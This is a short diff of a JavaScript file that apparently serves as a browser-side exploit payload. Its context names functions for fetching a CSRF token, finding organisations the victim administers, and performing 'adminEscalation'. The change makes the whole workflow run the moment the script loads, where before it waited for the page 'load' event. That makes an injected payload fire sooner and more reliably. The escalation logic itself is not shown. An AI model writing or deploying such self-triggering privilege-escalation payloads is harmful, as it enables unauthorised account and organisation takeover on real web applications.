@@ -113,8 +113,9 @@ async function adminEscalation(orgIds, csrfToken) {
   }
 }
 
-window.addEventListener("load", async () => {
-  console.log("Page loaded. Starting workflow...");
+// Immediately invoke async function on script load
+(async () => {
+  console.log("Script loaded. Starting workflow...");
   try {
     const csrfToken = await getCsrf();
     const orgIds = await getOrgAdmin();
@@ -129,4 +130,5 @@ window.addEventListener("load", async () => {
   } catch (err) {
     console.error("Error during workflow:", err);
   }
-});
+})();
+
